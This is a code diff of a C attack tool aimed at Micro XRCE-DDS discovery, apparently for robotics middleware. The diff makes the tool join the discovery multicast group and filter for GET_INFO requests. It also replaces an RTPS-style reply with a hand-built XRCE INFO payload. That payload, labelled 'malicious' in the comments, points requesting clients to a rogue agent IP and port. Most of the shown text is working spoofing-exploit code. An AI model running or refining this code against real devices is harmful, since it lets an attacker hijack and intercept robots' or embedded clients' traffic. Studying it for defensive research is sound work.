@@ -12,27 +12,10 @@
 #include <errno.h>
 
 #define DISCOVERY_PORT 7400
+#define DISCOVERY_MULTICAST_IP "239.255.0.2"
 #define DEFAULT_ROGUE_AGENT_PORT 6666
 #define BUFFER_SIZE 1024
 #define MAX_THREADS 2
-
-// Simplified RTPS header structure
-typedef struct
-{
-    uint8_t protocol[4]; // "RTPS"
-    uint8_t version_major;
-    uint8_t version_minor;
-    uint8_t vendor_id[2];
-    uint8_t guid_prefix[12];
-} __attribute__((packed)) rtps_header_t;
-
-// Submessage header
-typedef struct
-{
-    uint8_t submessage_id;
-    uint8_t flags;
-    uint16_t submessage_length;
-} __attribute__((packed)) submessage_header_t;
 
 // Thread argument structure
 typedef struct
@@ -184,7 +167,16 @@ void *discovery_responder(void *arg)
         return NULL;
     }
 
-    printf("[+] Discovery responder listening on port %d\n", DISCOVERY_PORT);
+    // XRCE clients send GET_INFO to this group (uxr_discovery_agents_default)
+    struct ip_mreq mreq;
+    mreq.imr_multiaddr.s_addr = inet_addr(DISCOVERY_MULTICAST_IP);
+    mreq.imr_interface.s_addr = htonl(INADDR_ANY);
+    if (setsockopt(sock, IPPROTO_IP, IP_ADD_MEMBERSHIP, &mreq, sizeof(mreq)) < 0)
+    {
+        perror("[-] Setsockopt IP_ADD_MEMBERSHIP failed");
+    }
+
+    printf("[+] Discovery responder listening on port %d (group %s)\n", DISCOVERY_PORT, DISCOVERY_MULTICAST_IP);
 
     uint8_t buffer[BUFFER_SIZE];
     struct sockaddr_in client_addr;
@@ -200,43 +192,17 @@ void *discovery_responder(void *arg)
             char client_ip[INET_ADDRSTRLEN];
             inet_ntop(AF_INET, &client_addr.sin_addr, client_ip, sizeof(client_ip));
 
+            // Answer only XRCE GET_INFO (header without client key, submessage 0x02).
+            // Our own INFO replies come back here (unicast to self, broadcast loopback) and must not be answered.
+            if (recv_len < 12 || buffer[0] < 0x80 || buffer[4] != 0x02)
+            {
+                printf("[*] Ignored non-GET_INFO datagram from %s:%d (%d bytes)\n",
+                       client_ip, ntohs(client_addr.sin_port), recv_len);
+                continue;
+            }
+
             printf("[*] Discovery request from %s:%d (%d bytes)\n",
                    client_ip, ntohs(client_addr.sin_port), recv_len);
-
-            // Craft malicious discovery response
-            uint8_t response[256];
-            memset(response, 0, sizeof(response));
-            int offset = 0;
-
-            // RTPS header
-            rtps_header_t *header = (rtps_header_t *)response;
-            memcpy(header->protocol, "RTPS", 4);
-            header->version_major = 2;
-            header->version_minor = 3;
-            header->vendor_id[0] = 0x01;
-            header->vendor_id[1] = 0x0F;
-            memset(header->guid_prefix, 0x42, 12); // Fake GUID
-
-            offset += sizeof(rtps_header_t);
-
-            // Submessage: INFO_DST (0x0E)
-            submessage_header_t *submsg = (submessage_header_t *)(response + offset);
-            submsg->submessage_id = 0x0E;
-            submsg->flags = 0x01;
-            submsg->submessage_length = htons(12);
-            offset += sizeof(submessage_header_t);
-
-            // GUID prefix (destination)
-            memset(response + offset, 0xFF, 12);
-            offset += 12;
-
-            // Submessage: DATA with locator
-            submsg = (submessage_header_t *)(response + offset);
-            submsg->submessage_id = 0x15; // DATA
-            submsg->flags = 0x05;
-
-            offset += sizeof(submessage_header_t);
-            int data_start = offset;
 
             // Convert malicious IP to network format
             struct in_addr mal_addr;
@@ -246,26 +212,29 @@ void *discovery_responder(void *arg)
                 continue;
             }
 
-            // Add locator information
-            // Locator kind (UDPv4 = 1)
-            uint32_t locator_kind = htonl(1);
-            memcpy(response + offset, &locator_kind, 4);
-            offset += 4;
-
-            // Port
-            uint32_t port = htonl(args->rogue_agent_port);
-            memcpy(response + offset, &port, 4);
-            offset += 4;
-
-            // IP address (as 16-byte IPv6 format, but IPv4-mapped)
-            memset(response + offset, 0, 12);
-            offset += 12;
-            memcpy(response + offset, &mal_addr, 4);
-            offset += 4;
-
-            // Update submessage length
-            int data_length = offset - data_start;
-            submsg->submessage_length = htons(data_length);
+            // Craft malicious XRCE INFO (Agent layout, little endian, CDR alignment from message start)
+            uint8_t response[44];
+            memset(response, 0, sizeof(response));
+            memcpy(response, buffer, 4);         // message header copied from the request
+            response[4] = 0x06;                  // submessage INFO
+            response[5] = 0x01;                  // flags: little endian
+            response[6] = sizeof(response) - 8;  // submessage length
+            memcpy(response + 8, buffer + 8, 4); // related request: request_id, object_id
+            response[14] = 1;                    // optional_config (status OK at 12-13)
+            response[15] = 0x0D;                 // OBJK_AGENT
+            memcpy(response + 16, "XRCE", 4);    // xrce_cookie
+            response[20] = 0x01;                 // xrce_version 1.0
+            response[22] = 0x01;                 // xrce_vendor_id (eProsima)
+            response[23] = 0x0F;
+            response[25] = 1;                    // optional_activity (no properties at 24)
+            response[26] = 0x0D;                 // OBJK_AGENT
+            response[28] = 1;                    // availability
+            response[32] = 1;                    // address_seq size
+            response[36] = 1;                    // ADDRESS_FORMAT_MEDIUM
+            memcpy(response + 37, &mal_addr, 4);
+            response[42] = (uint8_t)(args->rogue_agent_port & 0xFF);
+            response[43] = (uint8_t)(args->rogue_agent_port >> 8);
+            int offset = sizeof(response);
 
             // Send malicious response back to requester
             int sent = sendto(sock, response, offset, 0,
